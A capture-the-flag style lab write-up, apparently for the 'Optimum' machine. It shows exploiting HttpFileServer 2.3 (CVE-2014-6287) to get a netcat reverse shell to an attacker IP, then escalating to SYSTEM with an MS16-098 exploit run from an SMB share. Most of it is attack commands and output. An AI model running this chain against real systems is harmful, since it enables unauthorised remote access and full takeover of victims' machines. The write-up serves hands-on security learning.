Service is open in port 80 so checking the website we see a running server called HttpFileServer version 2.3. After looking for some info we found the vulnerability CVE-2014-6287 and this **[verified exploit in exploitDB](https://www.exploit-db.com/exploits/39161)**. Watching the code it says that we have to publish the nc.exe binary in a web server (http://<attackers_ip>:80/nc.exe) to be retrieved in machine a used to get a reverse shell

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Optimum-10.10.10.8]
└─$ locate nc.exe  
/home/kali/Documents/StartingPoint/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
                                                                            
┌──(kali㉿kali)-[~/Documents/Boxes/Optimum-10.10.10.8]
└─$ cp /usr/share/windows-resources/binaries/nc.exe . 
                                                                            
┌──(kali㉿kali)-[~/Documents/Boxes/Optimum-10.10.10.8]
└─$ python3 -m http.server 80                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

After that we have to modify the code with our IP and Port, open a netcat listener and execute the exploit

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Optimum-10.10.10.8]
└─$ source ~/Documents/virtualenv_environments/python2.7/venv/bin/activate
                                                                            
┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Optimum-10.10.10.8]
└─$ python 39161 10.10.10.8 80

----------------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 443 
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.8] 49166
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas
```

And we got a shell, now lets escalate privileges. Using Windows Exploit Suggester we decide to use the vulnerability MS16-098, and we will use **[this exploit](https://github.com/sensepost/ms16-098/tree/master)**. After downloading this, we will move it and execute it in the victim machine through a smb share

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Optimum-10.10.10.8]
└─$ ls
bfill.exe
                                                                            
┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Optimum-10.10.10.8]
└─$ sudo impacket-smbserver share -smb2support .
[sudo] password for kali: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

-------------------------

C:\Users\kostas\Desktop>\\10.10.14.14\share\bfill.exe
\\10.10.14.14\share\bfill.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```

And we are nt authority\system!